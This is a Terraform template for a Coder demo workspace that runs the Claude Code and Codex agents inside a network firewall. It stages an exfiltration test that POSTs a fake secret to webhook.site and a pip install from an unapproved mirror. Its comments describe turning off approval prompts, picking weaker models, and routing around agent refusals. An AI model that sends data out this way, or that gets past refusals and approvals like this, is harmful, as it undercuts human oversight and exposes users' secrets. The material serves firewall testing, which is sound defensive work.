# =============================================================================
# Demo: AI Governance — Kubernetes Development Template
# =============================================================================
# Demo environment for AI agent governance on Kubernetes. Ships with Coder
# Agent Firewall (boundary) installed and preconfigured so AI agents can
# be run inside a default-deny network jail, AI Bridge wiring so the
# agents authenticate via session tokens (no external API keys), and
# pre-staged demo scripts plus a prompt-injected sample repo so the
# firewall's value is easy to exercise in a live demo.
#
# Workspace access (three buttons in the Coder dashboard):
#     - VS Code Desktop (built-in display_app)
#     - code-server       (module — VS Code in the browser)
#     - Terminal          (built-in display_app — web terminal)
#
# Included CLIs:
#     - Claude Code (Anthropic, native install)
#     - Codex       (OpenAI, npm)
#
# Agent sandbox:
#     - boundary (Coder Agent Firewall) — invoked as `boundary -- <cmd>`
#
# AI access:
#   Both CLIs authenticate through Coder AI Bridge using the workspace
#   owner's session token — no external API keys needed.
#
# Gemini CLI and Kiro CLI are intentionally NOT installed here: AI
# Bridge / AI Gateway does not currently support them (Gemini: no
# Google API support in aibridge — upstream issue coder/aibridge#27;
# Kiro: no way to override base URL). Re-add them here when aibridge
# supports the Google API, or move them to a separate non-firewalled
# template where per-user auth is expected.
#
# Key environment variables (set on the agent):
#   ANTHROPIC_BASE_URL / ANTHROPIC_API_BASE — AI Bridge Anthropic endpoint
#   OPENAI_BASE_URL                         — AI Bridge OpenAI endpoint
#   CLAUDE_API_KEY                          — session token (for Claude Code CLI)
#   OPENAI_API_KEY                          — session token (for Codex CLI)
#
# Why CLAUDE_API_KEY instead of ANTHROPIC_API_KEY?
#   Claude Code CLI reads CLAUDE_API_KEY for its primary auth. It uses
#   ANTHROPIC_BASE_URL to know where to send requests. Setting
#   ANTHROPIC_API_KEY would also work, but CLAUDE_API_KEY is the canonical
#   env var for the Claude Code CLI specifically.
#
# Agent Firewall:
#   The `boundary` binary is installed to /usr/local/bin and preconfigured
#   via ~/.config/coder_boundary/config.yaml. The allowlist lives in
#   ./boundary.config.yaml.tftpl (rendered with templatefile() at plan
#   time) — edit that file to add/remove domains, NOT this one.
#   Wrappers at ~/.local/bin/boundary-wrappers/<tool> force every AI CLI
#   invocation (claude, codex) through boundary by default. nsjail (the
#   default backend) escalates privileges via sudo.
# =============================================================================

terraform {
  required_providers {
    coder = {
      source = "coder/coder"
    }
    kubernetes = {
      source = "hashicorp/kubernetes"
    }
  }
}

# -----------------------------------------------------------------------------
# Provider Configuration
# -----------------------------------------------------------------------------

provider "coder" {}

variable "use_kubeconfig" {
  type        = bool
  description = "Use host kubeconfig instead of in-cluster config"
  default     = false
}

variable "namespace" {
  type        = string
  description = "Kubernetes namespace for workspaces"
  default     = "coder-workspaces"
}

variable "image_registry" {
  description = "Container registry that hosts the workspace base images. Defaults to this repo's GHCR namespace; override at template-push time if you fork."
  type        = string
  default     = "ghcr.io/coder/demo-aigov-rhaiis-rhsummit-2026"
}

provider "kubernetes" {
  config_path = var.use_kubeconfig ? "~/.kube/config" : null
}

data "coder_provisioner" "me" {}
data "coder_workspace" "me" {}
data "coder_workspace_owner" "me" {}

data "coder_external_auth" "github" {
  id       = "github"
  optional = true
}

data "coder_external_auth" "gitlab" {
  id       = "gitlab"
  optional = true
}

# -----------------------------------------------------------------------------
# Parameters — workspace sizing and optional features
# -----------------------------------------------------------------------------

data "coder_parameter" "cpu" {
  name         = "cpu"
  display_name = "CPU Cores"
  description  = "CPU limit for the workspace pod"
  type         = "number"
  default      = "4"
  mutable      = true
  icon         = "/icon/memory.svg"

  option {
    name  = "2 Cores"
    value = "2"
  }
  option {
    name  = "4 Cores"
    value = "4"
  }
  option {
    name  = "8 Cores"
    value = "8"
  }
}

data "coder_parameter" "memory" {
  name         = "memory"
  display_name = "Memory (GB)"
  description  = "Memory allocation for the workspace pod"
  type         = "number"
  default      = "8"
  mutable      = true
  icon         = "/icon/memory.svg"

  option {
    name  = "4 GB"
    value = "4"
  }
  option {
    name  = "8 GB"
    value = "8"
  }
  option {
    name  = "12 GB"
    value = "12"
  }
  option {
    name  = "16 GB"
    value = "16"
  }
  option {
    name  = "24 GB"
    value = "24"
  }
}

data "coder_parameter" "disk_size" {
  name         = "disk_size"
  display_name = "Disk Size (GB)"
  description  = "Persistent volume size — cannot be changed after creation"
  type         = "number"
  default      = "20"
  mutable      = false
  icon         = "/icon/database.svg"

  option {
    name  = "10 GB"
    value = "10"
  }
  option {
    name  = "20 GB"
    value = "20"
  }
  option {
    name  = "50 GB"
    value = "50"
  }
}

data "coder_parameter" "git_repo" {
  name         = "git_repo"
  display_name = "Git Repository"
  description  = "Repository to clone on workspace start. Defaults to a demo repo (cool-project) whose README contains a prompt-injection payload for exercising the Agent Firewall; clear this field to skip cloning."
  type         = "string"
  default      = "https://gitlab.zambruhni.com/lab/cool-project.git"
  mutable      = false
  icon         = "/icon/git.svg"
}

# Dotfiles URL/branch declared at the template root (rather than taking
# the module's built-in ones) so the workspace preset + prebuilds block
# can reference them by name — Coder's preset validator only sees
# template-root coder_parameter data sources, not module-internal ones.
# These get passed into module.dotfiles as `dotfiles_uri` / `dotfiles_branch`
# which suppresses the module's own prompts.
data "coder_parameter" "dotfiles_uri" {
  name         = "dotfiles_uri"
  display_name = "Dotfiles URL"
  description  = "Git repository URL for your dotfiles. Defaults to the shared demo dotfiles. Clear this to skip the clone."
  type         = "string"
  default      = "https://github.com/ausbru87/dotfiles"
  mutable      = true
  icon         = "/icon/dotfiles.svg"
}

data "coder_parameter" "dotfiles_branch" {
  name         = "dotfiles_branch"
  display_name = "Dotfiles Branch"
  description  = "Branch of the dotfiles repo to check out. `demo` is the minimal sales-demo .bashrc; `main` has the full dev setup."
  type         = "string"
  default      = "demo"
  mutable      = true
}

# -----------------------------------------------------------------------------
# Locals — AI Bridge URLs and tool configuration
# -----------------------------------------------------------------------------

locals {
  # AI Bridge endpoints — proxied through Coder, authenticated via session token
  ai_bridge_anthropic_url = "${data.coder_workspace.me.access_url}/api/v2/aibridge/anthropic"
  ai_bridge_openai_url    = "${data.coder_workspace.me.access_url}/api/v2/aibridge/openai"
  ai_bridge_openai_v1_url = "${data.coder_workspace.me.access_url}/api/v2/aibridge/openai/v1"

  # Coder access URL hostname — substituted into boundary.config.yaml.tftpl
  # so agents can reach AI Bridge, AgentAPI, and the workspace agent.
  coder_host = replace(replace(data.coder_workspace.me.access_url, "https://", ""), "http://", "")

  # Agent Firewall (boundary) config — loaded from the sibling
  # boundary.config.yaml.tftpl file. Edit that file to change the allowlist;
  # don't inline rules here.
  boundary_config_yaml = templatefile("${path.module}/boundary.config.yaml.tftpl", {
    coder_host = local.coder_host
  })

  # Claude Code settings.json — written to ~/.claude/settings.json
  # Controls environment variables, model selection, and onboarding state
  claude_settings = {
    env = {
      ANTHROPIC_BASE_URL  = local.ai_bridge_anthropic_url
      OPENAI_BASE_URL     = local.ai_bridge_openai_url
      GH_TOKEN            = data.coder_external_auth.github.access_token
      GH_USERNAME         = data.coder_workspace_owner.me.name
      GITLAB_TOKEN        = data.coder_external_auth.gitlab.access_token
      GITLAB_USER         = data.coder_workspace_owner.me.name
      GITLAB_HOST         = "gitlab.rhsummit.coderdemo.io"
      GIT_AUTHOR_NAME     = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
      GIT_AUTHOR_EMAIL    = data.coder_workspace_owner.me.email
      GIT_COMMITTER_NAME  = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
      GIT_COMMITTER_EMAIL = data.coder_workspace_owner.me.email
    }
    autoUpdaterStatus            = "disabled"
    hasAcknowledgedCostThreshold = true
    hasCompletedOnboarding       = true
  }

  # Claude Code config — written to ~/.claude.json
  # Contains the API key (session token) and per-project onboarding state
  claude_config = {
    autoUpdaterStatus            = "disabled"
    hasAcknowledgedCostThreshold = true
    hasCompletedOnboarding       = true
    primaryApiKey                = data.coder_workspace_owner.me.session_token
    projects = {
      "/home/coder" = {
        hasCompletedProjectOnboarding = true
        hasTrustDialogAccepted        = true
      }
    }
  }

}

# -----------------------------------------------------------------------------
# Agent — startup script installs CLIs and writes config files
# -----------------------------------------------------------------------------

resource "coder_agent" "main" {
  arch = data.coder_provisioner.me.arch
  os   = "linux"

  # The startup script runs on every workspace start. It:
  #   1. Sets up PATH for npm global bin, ~/.local/bin
  #   2. Installs Claude Code (native) and Codex (npm)
  #   3. Installs the boundary binary and writes its allowlist config
  #   4. Writes Claude Code config (settings.json + .claude.json)
  #   5. Writes Codex config (config.toml with AI Bridge provider)
  #   6. Generates boundary wrappers under ~/.local/bin/boundary-wrappers/
  startup_script = <<-EOT
    #!/bin/bash
    touch ~/.bashrc

    # Set up PATH for this script (npm global bin + ~/.local/bin for native installs)
    NPM_BIN="$(npm config get prefix)/bin"
    export PATH="$HOME/.local/bin:$NPM_BIN:$PATH"

    # Persist PATH additions in .profile (sourced by login shells / Coder terminal)
    for P in "$HOME/.local/bin" "$NPM_BIN"; do
      grep -qF "$P" ~/.profile 2>/dev/null || echo "export PATH=\"$P:\$PATH\"" >> ~/.profile
    done

    # Install Claude Code CLI — pinned to a known-good stable release.
    # Bump the version here when validating a newer Anthropic release.
    # `stable` would auto-track, but explicit pinning is reproducible.
    # Installer syntax: `bash -s -- [stable|latest|VERSION]`.
    echo "Installing Claude Code CLI v2.1.116..."
    curl -fsSL https://claude.ai/install.sh | bash -s -- 2.1.116 || echo "Warning: Claude Code install failed"

    # Point npm globals at the user's HOME so `npm install -g` doesn't
    # need sudo. Without this they default to /usr and fail under
    # restricted-v2 (CAP_SETUID dropped → sudo can't elevate).
    npm config set prefix "$HOME/.local" >/dev/null
    export PATH="$HOME/.local/bin:$PATH"

    # Install Codex CLI — pinned explicitly. The npm @latest dist-tag
    # currently points at 0.122.0 (OpenAI publishes prereleases to
    # separate tags: @alpha, @beta), but pinning gives a reproducible
    # build. Bump here after testing a newer release.
    echo "Installing Codex CLI v0.122.0..."
    npm install --global --no-fund --no-audit @openai/codex@0.122.0 || echo "Warning: Codex install failed"

    # Install Coder Agent Firewall (boundary) — nsjail-based process isolator
    echo "Installing Agent Firewall (boundary)..."
    curl -fsSL https://raw.githubusercontent.com/coder/boundary/main/install.sh | bash || echo "Warning: boundary install failed"

    # Write boundary config — loaded automatically by `boundary` from
    # ~/.config/coder_boundary/config.yaml
    echo "Configuring Agent Firewall..."
    mkdir -p ~/.config/coder_boundary
    echo '${base64encode(local.boundary_config_yaml)}' | base64 -d > ~/.config/coder_boundary/config.yaml
    chmod 600 ~/.config/coder_boundary/config.yaml

    # Claude Code configuration
    echo "Configuring Claude Code..."
    mkdir -p ~/.claude
    cat > ~/.claude/settings.json << 'CLAUDESETTINGS'
    ${jsonencode(local.claude_settings)}
    CLAUDESETTINGS
    cat > ~/.claude.json << 'CLAUDECONFIG'
    ${jsonencode(local.claude_config)}
    CLAUDECONFIG

    # Codex configuration (AI Bridge).
    #
    # sandbox_mode = "danger-full-access" disables Codex's internal
    # bubblewrap-based bash sandbox. That sandbox collides with the
    # NET_ADMIN + SYS_ADMIN capabilities the pod needs for boundary's
    # nsjail backend — bwrap fails with "Unexpected capabilities but
    # not setuid". The workspace pod itself is the sandbox here (PVC-
    # scoped fs, container isolation, boundary filtering the network),
    # so bwrap is redundant even when it works.
    #
    # [notice] and [projects] blocks match task-runner-codex: suppress
    # the interactive prompts Codex would otherwise show at first run.
    echo "Configuring Codex..."
    mkdir -p ~/.codex
    cat > ~/.codex/config.toml << 'CODEXEOF'
    sandbox_mode = "danger-full-access"
    approval_policy = "never"
    preferred_auth_method = "apikey"
    profile = "aibridge"

    [projects."/home/coder"]
    trust_level = "trusted"

    [notice]
    hide_full_access_warning = true
    hide_gpt5_1_migration_prompt = true
    "hide_gpt-5.1-codex-max_migration_prompt" = true
    hide_rate_limit_model_nudge = true
    hide_world_writable_warning = true

    [model_providers.aibridge]
    name = "AI Bridge"
    base_url = "${local.ai_bridge_openai_v1_url}"
    env_key = "OPENAI_API_KEY"
    wire_api = "responses"

    [profiles.aibridge]
    model_provider = "aibridge"
    model = "gpt-5.3-codex"
    model_reasoning_effort = "medium"
    CODEXEOF

    # Install boundary wrappers so every AI CLI runs under the firewall by
    # default. Each wrapper at ~/.local/bin/boundary-wrappers/<tool> exec's
    # `boundary -- <real-tool-path> "$@"`. Prepending the wrappers dir to
    # PATH means `claude` (and friends) resolve to the wrapper first. Users
    # who need to bypass the firewall (e.g. for debugging) can still call
    # the real binary by its absolute path.
    # Default args per tool — two purposes:
    #
    # 1. Prompt-free operation inside the firewall. Boundary IS the
    #    security boundary here; the per-tool approval prompts are
    #    redundant friction once the whole workspace is jailed. So we
    #    force the agents into their respective "skip prompts" modes.
    #
    # 2. Downgrade models for the demo. Smaller / older models do less
    #    safety deliberation and more "just run it" — exactly what we
    #    want when the whole point is to exercise the firewall. On
    #    larger reasoning models (Opus, Codex 5.4) the agent often
    #    refuses to run even obviously benign demo commands because it
    #    pattern-matches them as exfil attempts. Haiku + the codex-mini
    #    variant will happily try things, and boundary catches whatever
    #    they shouldn't have tried.
    #
    # Users can still opt back in to the strong model / full prompts by
    # invoking the real binary by absolute path (e.g.
    # /home/coder/.local/bin/claude) with their own flags.
    #
    # claude: --dangerously-skip-permissions --model haiku
    # codex:  --dangerously-bypass-approvals-and-sandbox --model gpt-5.1-codex-mini
    echo "Installing boundary wrappers..."
    WRAPPERS_DIR="$HOME/.local/bin/boundary-wrappers"
    mkdir -p "$WRAPPERS_DIR"
    for tool in claude codex; do
      REAL_BIN="$(command -v "$tool" 2>/dev/null || true)"
      if [ -z "$REAL_BIN" ]; then
        echo "  skip $tool (not installed)"
        continue
      fi
      case "$tool" in
        claude) DEFAULT_ARGS="--dangerously-skip-permissions --model haiku" ;;
        codex)  DEFAULT_ARGS="--dangerously-bypass-approvals-and-sandbox --model gpt-5.1-codex-mini" ;;
      esac
      printf '#!/usr/bin/env bash\nexec boundary -- %q %s "$@"\n' "$REAL_BIN" "$DEFAULT_ARGS" > "$WRAPPERS_DIR/$tool"
      chmod +x "$WRAPPERS_DIR/$tool"
      echo "  $tool → boundary -- $REAL_BIN $DEFAULT_ARGS"
    done

    # Cover every common interactive shell. zsh users' dotfiles
    # (oh-my-zsh and friends) may later OVERWRITE these files — the
    # dotfiles module's post_clone_script (see below) re-applies the
    # PATH export as a safety net after user dotfiles land.
    for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.zprofile"; do
      touch "$RC"
      grep -qF 'boundary-wrappers' "$RC" || \
        echo 'export PATH="$HOME/.local/bin/boundary-wrappers:$PATH"' >> "$RC"
    done

    # Pre-stage demo scripts so they're ready for a live Agent-Firewall
    # demo without any setup in the terminal. Each script runs a
    # deliberately off-allowlist request that boundary should drop.
    # The agent-refusal path is sidestepped by having the user ask the
    # agent to "run this script" rather than craft the dangerous command
    # in-session — the agent isn't choosing to exfiltrate, it's running
    # a file the operator already placed on disk.
    echo "Staging Agent Firewall demo scripts..."
    mkdir -p "$HOME/demo"

    cat > "$HOME/demo/exfil-test.sh" << 'EXFILDEMO'
    #!/usr/bin/env bash
    # Attempts a POST to webhook.site. Host is NOT on the Agent Firewall
    # allowlist — boundary will drop the connection and the script will
    # fail. Run via: boundary -- ~/demo/exfil-test.sh (or ask an agent
    # to run it under its Bash tool).
    set -e
    UUID="$(uuidgen 2>/dev/null || date +%s)"
    echo "Attempting POST to https://webhook.site/$UUID ..."
    curl -sS -X POST -d 'SECRET=fake-api-key-abc123' "https://webhook.site/$UUID"
    echo
    echo "Unexpected: POST succeeded. Is boundary installed and in PATH?"
    EXFILDEMO
    chmod +x "$HOME/demo/exfil-test.sh"

    cat > "$HOME/demo/unknown-registry-test.sh" << 'PIPDEMO'
    #!/usr/bin/env bash
    # Attempts a pip install from an index URL that isn't on the
    # allowlist. Boundary drops the connection; pip fails with a
    # resolver error. Simulates a typosquat / malicious-mirror attack.
    set -e
    echo "Attempting pip install from unapproved mirror..."
    pip install --dry-run --index-url https://unknown-pypi.example.com/simple suspicious-pkg
    echo "Unexpected: resolver succeeded. Is boundary installed?"
    PIPDEMO
    chmod +x "$HOME/demo/unknown-registry-test.sh"

    cat > "$HOME/demo/README.md" << 'DEMOREADME'
    # Operator firewall smoke tests

    These scripts exist so a demo operator can verify boundary is in the
    network path BEFORE walking an audience through the agent-facing
    parts of the demo. They are NOT meant to be discovered or run by an
    agent in the course of the demo itself — if an agent explores
    ~/demo/ it will short-circuit the "realistic agent interaction"
    framing. Treat ~/demo/ as operator territory, and keep the agent
    pointed at ~/cool-project/ (or wherever your real workspace code
    lives).

    Tail /tmp/boundary_logs/ in another terminal to watch DENY events
    land live as you run either of these.

    ## ~/demo/exfil-test.sh
    POST to webhook.site. webhook.site is NOT on the allowlist, so
    boundary drops the connection; curl fails. Expected exit code != 0.

    ## ~/demo/unknown-registry-test.sh
    pip install from a non-allowlisted --index-url. Boundary drops the
    resolver request; pip fails with a name-resolution or connection
    error. Expected exit code != 0.

    ## Want to test the inverse (allowed hosts)?
    Just run, from the same terminal — no need for a script:

      curl -sI https://registry.npmjs.org | head -1      # expect HTTP/2 200
      pip install --dry-run requests                     # expect success
    DEMOREADME

    echo "=== Workspace Ready ==="
  EOT

  # Do NOT set PATH here — the Coder agent extracts its own `coder` binary
  # at start and adds that location to PATH dynamically, which is what the
  # `coder stat cpu/mem/disk` metadata probes below depend on. Overriding
  # PATH here breaks the dashboard metrics with `coder: command not found`.
  # Wrapper coverage for claude/codex is handled through
  # ~/.profile and ~/.bashrc in the startup_script — sufficient for the
  # interactive shells where users actually invoke those CLIs.
  env = {
    EDITOR             = "code"
    VISUAL             = "code"
    ANTHROPIC_BASE_URL = local.ai_bridge_anthropic_url
    ANTHROPIC_API_BASE = local.ai_bridge_anthropic_url
    OPENAI_BASE_URL    = local.ai_bridge_openai_url

    # Coder v2.33 flipped devcontainer detection from opt-in to opt-on.
    # With no docker socket in the pod, the agent still tries `docker ps`
    # on every dashboard poll and hangs 4-8s per call, making the UI feel
    # broken. Opt back out since this template has no devcontainer flow.
    CODER_AGENT_DEVCONTAINERS_ENABLE = "false"
  }

  # Pin the workspace dashboard to exactly three access options:
  # VS Code Desktop (built-in), Terminal (built-in), and code-server
  # (module, defined below). Everything else (VS Code Insiders, SSH,
  # port-forwarding helper) is hidden to keep the UI focused.
  display_apps {
    vscode                 = true
    vscode_insiders        = false
    web_terminal           = true
    ssh_helper             = false
    port_forwarding_helper = false
  }

  metadata {
    display_name = "CPU Usage"
    key          = "cpu_usage"
    script       = "coder stat cpu"
    interval     = 10
    timeout      = 1
  }

  metadata {
    display_name = "Memory Usage"
    key          = "mem_usage"
    script       = "coder stat mem"
    interval     = 10
    timeout      = 1
  }

  metadata {
    display_name = "Disk Usage"
    key          = "disk_usage"
    script       = "coder stat disk --path /home/coder"
    interval     = 60
    timeout      = 1
  }
}

# -----------------------------------------------------------------------------
# AI Bridge API Keys — injected as env vars via coder_env
# -----------------------------------------------------------------------------
# These use the workspace owner's Coder session token as the "API key".
# AI Bridge validates this token and proxies requests to the real AI providers.

# CLAUDE_API_KEY — used by Claude Code CLI for authentication
resource "coder_env" "claude_api_key" {
  agent_id = coder_agent.main.id
  name     = "CLAUDE_API_KEY"
  value    = data.coder_workspace_owner.me.session_token
}

# OPENAI_API_KEY — used by Codex CLI for authentication
resource "coder_env" "openai_api_key" {
  agent_id = coder_agent.main.id
  name     = "OPENAI_API_KEY"
  value    = data.coder_workspace_owner.me.session_token
}

# -----------------------------------------------------------------------------
# Coder Registry Modules
# -----------------------------------------------------------------------------

# code-server — VS Code in the browser, accessible via subdomain.
# The other two workspace-access buttons (VS Code Desktop and Terminal)
# come from coder_agent.main.display_apps above — they're built-in and
# don't need modules.
module "code-server" {
  count     = data.coder_workspace.me.start_count
  source    = "registry.coder.com/coder/code-server/coder"
  version   = "1.3.1"
  agent_id  = coder_agent.main.id
  folder    = "/home/coder"
  subdomain = true
  order     = 1
}

# dotfiles — clone and apply user dotfiles on workspace start
module "dotfiles" {
  count    = data.coder_workspace.me.start_count
  source   = "registry.coder.com/coder/dotfiles/coder"
  version  = "1.4.1"
  agent_id = coder_agent.main.id

  # Pass the template-root coder_parameter values into the module.
  # Because these are non-null, the module skips creating its own
  # internal parameters — the root-level ones we defined above are
  # what the user sees on the create form.
  dotfiles_uri    = data.coder_parameter.dotfiles_uri.value
  dotfiles_branch = data.coder_parameter.dotfiles_branch.value

  # post_clone_script runs after the user's dotfiles are applied. The
  # startup_script above appends the boundary-wrappers PATH export to
  # .profile/.bashrc/.zshrc/.zprofile, but many dotfiles repos (oh-my-zsh,
  # prezto, etc.) REPLACE those files wholesale, wiping our export. This
  # hook re-appends it to whatever rc files are in place post-clone — so
  # `claude` and `codex` always resolve to the boundary-wrapped version
  # regardless of what the dotfiles did.
  post_clone_script = <<-EOT
    #!/usr/bin/env bash
    set -e
    LINE='export PATH="$HOME/.local/bin/boundary-wrappers:$PATH"'
    for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.zprofile"; do
      [ -f "$RC" ] || continue
      grep -qF 'boundary-wrappers' "$RC" && continue
      echo "$LINE" >> "$RC"
    done
  EOT
}

# git-clone — clone a repo into /home/coder on workspace start
module "git-clone" {
  count    = data.coder_parameter.git_repo.value != "" ? data.coder_workspace.me.start_count : 0
  source   = "registry.coder.com/coder/git-clone/coder"
  version  = "1.2.3"
  agent_id = coder_agent.main.id
  url      = data.coder_parameter.git_repo.value
  base_dir = "/home/coder"
}

# -----------------------------------------------------------------------------
# Kubernetes Resources
# -----------------------------------------------------------------------------

resource "kubernetes_persistent_volume_claim_v1" "home" {
  metadata {
    name      = "coder-${data.coder_workspace.me.id}-home"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-workspace"
      "app.kubernetes.io/instance" = "coder-${data.coder_workspace.me.id}"
      "app.kubernetes.io/part-of"  = "coder"
    }
  }
  wait_until_bound = false
  spec {
    access_modes = ["ReadWriteOnce"]
    resources {
      requests = {
        storage = "${data.coder_parameter.disk_size.value}Gi"
      }
    }
  }

  lifecycle {
    ignore_changes = all
  }
}

resource "kubernetes_pod_v1" "workspace" {
  count = data.coder_workspace.me.start_count

  metadata {
    name      = "coder-${data.coder_workspace.me.id}"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-workspace"
      "app.kubernetes.io/instance" = "coder-${data.coder_workspace.me.id}"
      "app.kubernetes.io/part-of"  = "coder"
    }
  }

  spec {
    # Pod runs under the coder-firewall-runner ServiceAccount, which is
    # bound to the custom `coder-firewall-scc` SCC (see
    # manifests/cluster-config/coder-firewall-scc.yaml). That SCC mirrors
    # restricted-v2 but allows the NET_ADMIN + SYS_ADMIN capabilities
    # that boundary's nsjail backend needs. UID/SELinux/seccomp are still
    # injected by the SCC at admission time.
    service_account_name = "coder-firewall-runner"

    container {
      name              = "dev"
      image             = "${var.image_registry}/ubi9-node-workspace:latest"
      image_pull_policy = "Always"
      command           = ["/usr/local/bin/uid_entrypoint", "sh", "-c", coder_agent.main.init_script]

      # Only the capabilities stay in the container security_context —
      # everything else (UID, SELinux, seccomp) comes from the SCC.
      security_context {
        capabilities {
          add = ["NET_ADMIN", "SYS_ADMIN"]
        }
      }

      env {
        name  = "CODER_AGENT_TOKEN"
        value = coder_agent.main.token
      }

      env {
        name  = "CODER_AGENT_URL"
        value = data.coder_workspace.me.access_url
      }

      resources {
        requests = {
          "cpu"    = "1"
          "memory" = "${max(2, floor(data.coder_parameter.memory.value / 2))}Gi"
        }
        limits = {
          "cpu"    = "${data.coder_parameter.cpu.value}"
          "memory" = "${data.coder_parameter.memory.value}Gi"
        }
      }

      volume_mount {
        mount_path = "/home/coder"
        name       = "home"
        read_only  = false
      }
    }

    volume {
      name = "home"
      persistent_volume_claim {
        claim_name = kubernetes_persistent_volume_claim_v1.home.metadata[0].name
      }
    }

    affinity {
      pod_anti_affinity {
        preferred_during_scheduling_ignored_during_execution {
          weight = 1
          pod_affinity_term {
            topology_key = "kubernetes.io/hostname"
            label_selector {
              match_expressions {
                key      = "app.kubernetes.io/name"
                operator = "In"
                values   = ["coder-workspace"]
              }
            }
          }
        }
      }
    }
  }

  # Prebuild claim semantics: when a user claims a warm workspace, Coder
  # re-applies the template with the real owner. Any owner-specific
  # attribute on the pod (agent token baked into init_script, env vars,
  # labels) would otherwise trigger a recreate mid-claim. ignore_changes
  # = all keeps the running pod intact; the agent reconnects with the
  # claiming user's token through Coder's runtime.
  lifecycle {
    ignore_changes = all
  }
}
